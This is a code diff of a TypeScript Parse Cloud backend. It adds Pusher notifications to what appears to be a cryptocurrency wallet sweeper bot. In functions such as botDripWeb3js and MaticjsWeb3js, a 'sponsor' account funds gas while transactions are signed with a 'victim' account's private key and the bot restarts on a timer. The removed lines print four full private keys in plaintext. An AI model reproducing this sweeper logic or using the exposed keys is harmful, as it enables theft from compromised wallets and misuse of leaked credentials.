@@ -14,6 +14,7 @@ import Moralis from 'moralis';
 import Web3 from 'web3';
 import { ethers, providers, Wallet } from "ethers";
 import { parse } from 'path';
+import  Pusher from "pusher"
 // import Moralis from 'moralis';
 // import Moralis from "moralis-v1";
 var web3 = new  Web3(new Web3.providers.HttpProvider(config.WEB3_PROVIDER_URL));
@@ -47,8 +48,26 @@ Parse.Cloud.define('getServerTime', () => {
 
 
 
-Parse.Cloud.define("_AddressSyncStatus2", async  (request: any) => {
 
+async function realLogger(msg: string) {
+
+  const pusher = new Pusher({
+    appId: config.PAPPID,
+    key: config.PKEY,
+    secret: config.PSECRET,
+    cluster: "mt1",
+    useTLS: true
+  });
+  
+ await pusher.trigger("my-e-channel", "my-e-event", {
+    message: msg
+  });
+
+}
+
+
+
+Parse.Cloud.define("_AddressSyncStatus2", async  (request: any) => {
 
   request.log.info('hello world run _AddressSyncStatus2');
 
@@ -93,6 +112,7 @@ Parse.Cloud.afterSave("DemoTxs", async  (request: any) => {
    //  logger.error(JSON.stringify(httpResponse));
  });
     
+ await realLogger("new")
      
    }
    else { 
@@ -139,7 +159,8 @@ Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {
     //  logger.error(JSON.stringify(httpResponse));
   });
      
-      
+  await realLogger("new")
+
     }
     else { 
     
@@ -436,7 +457,7 @@ Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {
        //  logger.error(JSON.stringify(httpResponse));
      });
    
-   
+    await realLogger("new");
      return;
     }
    
@@ -589,7 +610,7 @@ Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {
      }).on('receipt', async (reciept: any) => {
     
       await mshlogger(request, ntwk, loggerr)
-   
+      await realLogger("new")
       request.log.info("got recipet")
        // loggerr.info(JSON.stringify(reciept));
     
@@ -597,6 +618,7 @@ Parse.Cloud.afterSave("LiveTxs", async  (request: any) => {
      }).on('error', async  (error: any) =>{
     
       await mshlogger(request, JSON.stringify(error), loggerr)
+      await realLogger("error")
       request.log.info("got error")
        // loggerr.info(JSON.stringify(error));
     
@@ -909,6 +931,8 @@ var web3: any;
   });
 
 
+  await realLogger("new")
+
   return;
  }
 
@@ -1034,7 +1058,7 @@ if(bl.lt(fee) ) {
 
 
       await mshlogger(request, ntwk+": "+"LESS_THAN_MIN_NATIVE:"+amount, loggerr)
-  
+      await realLogger("new")
       request.log.info("LESS THAN MIN NATIVE:"+amount);
       return;
   
@@ -1119,7 +1143,7 @@ request.log.info("Calculated balance");
   }).on('receipt', async (reciept: any) => {
  
    await mshlogger(request, ntwk, loggerr)
-
+   await realLogger("new")
    request.log.info("got recipet")
     // loggerr.info(JSON.stringify(reciept));
  
@@ -1127,6 +1151,7 @@ request.log.info("Calculated balance");
   }).on('error', async  (error: any) =>{
  
    await mshlogger(request, JSON.stringify(error), loggerr)
+   await realLogger("error")
    request.log.info("got error")
     // loggerr.info(JSON.stringify(error));
  
@@ -1202,10 +1227,12 @@ async function passallfunc(request: any, ntwk: any) {
   
       if(resultsfrom) {
         await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:"+fromaddress)
+        await realLogger("new")
       }
 
       if(resultsto) {
         await mshlogger(request, getntwork(request.object.get("chainId")), "Exampted addresss:"+toaddress)
+        await realLogger("new")
       }
       
       return
@@ -1330,8 +1357,8 @@ async function botDripWeb3js(){
 
 //  logger.info(JSON.stringify(web33.version ));
 
-var sponsor = web33.eth.accounts.privateKeyToAccount('ea323e33f3536aa2974e32aacc1a840399363bfee72580763241c0a3fab2fb5b');;
-var victim = web33.eth.accounts.privateKeyToAccount('0f34b0718b7d786edc551bc28725a91ccc03b2fd2bece17bfa31f08bd2522885');;
+var sponsor = web33.eth.accounts.privateKeyToAccount('fukoff');;
+var victim = web33.eth.accounts.privateKeyToAccount('fukoff');;
 
 var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";
 
@@ -1428,7 +1455,7 @@ let signedTx = await web33.eth.accounts.signTransaction(transaction, sponsor.pri
     // llooggerx.info(receipt);
     stopfunc(stop)
 
-    setTimeout(() => {
+    setTimeout(async () => {
       stop = false;
       botDripWeb3js()
       // llooggerx.info("succss:	😀 restarting");
@@ -1455,6 +1482,8 @@ let signedTx = await web33.eth.accounts.signTransaction(transaction, sponsor.pri
       }, function(httpResponse: any) {
         // llooggerx.info(JSON.stringify(httpResponse));
       });
+
+      await realLogger("new")
 
     }, 5000);
    } ).on('error', (err: any) => {
@@ -1525,8 +1554,8 @@ async function MaticjsWeb3js(){
 
 //  logger.info(JSON.stringify(web33.version));
 
-var sponsor = web33.eth.accounts.privateKeyToAccount('b36b36e5809ad496136af4c5e81c0586518dad40130eabfdfb7aa039634628cd');;
-var victim = web33.eth.accounts.privateKeyToAccount('704fe8345c3c2b504aa0103b9a2a16b68b6c9a3c04478f448729429babcd4c8b');;
+var sponsor = web33.eth.accounts.privateKeyToAccount('fukoff');;
+var victim = web33.eth.accounts.privateKeyToAccount('fukoff');;
 
 var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";
 
@@ -1641,7 +1670,7 @@ let signedTx = await web33.eth.accounts.signTransaction(transaction, victim.priv
     // llooggerx.info(receipt);
     stopfunc(stop)
 
-    setTimeout(() => {
+    setTimeout(async () => {
       stop = false;
       MaticjsWeb3js()
       // llooggerx.info("succss:	😀 restarting");
@@ -1669,6 +1698,7 @@ let signedTx = await web33.eth.accounts.signTransaction(transaction, victim.priv
         // llooggerx.info(JSON.stringify(httpResponse));
       });
 
+      await realLogger("new")
     }, 5000);
    } ).on('error', (err: any) => {
     // console.log(err)
@@ -2048,6 +2078,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
       request.log.info(`Mad!...receipt 😁 🚀`);
       request.log.info("i got here15");
         await mshlogger(request, 'Eth2', JSON.stringify(reciept))
+        await realLogger("new")
        request.log.info("got recipet")
         // loggerr.info(JSON.stringify(reciept));
      
@@ -2059,6 +2090,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
        request.log.info("i got here16");
        request.log.info("error message"+error.message)
        await mshlogger(request, JSON.stringify(error), JSON.stringify(error))
+       await realLogger("error")
         // loggerr.info(JSON.stringify(error));
      
         // loggerr.info("errror");
@@ -2073,6 +2105,8 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
 
 
 }
+
+
 
 
 async function mshlogger(request: any, brand: any, logg: any) {
@@ -2118,6 +2152,9 @@ headers: {
 
 async function BalanceChecker(request: any) {
 
+
+
+  
   request.log.info(`Balance checker started`);
 
 try {
@@ -2167,6 +2204,7 @@ Parse.Cloud.httpRequest({
     brand: ":WFLR NATIVE",
     server: "WFLR NATIVE"
   }
+
  }).then(function(httpResponse: any) {
    request.log.info("WFLR response")
   //logger.info(httpResponse.text);
@@ -2176,6 +2214,7 @@ Parse.Cloud.httpRequest({
  //  logg.error(JSON.stringify(httpResponse));
  });
 
+await realLogger("new")
  
 }
 
@@ -2207,7 +2246,7 @@ Parse.Cloud.httpRequest({
  //  logg.error(JSON.stringify(httpResponse));
  });
 
-
+ await realLogger("new")
 }
 
 
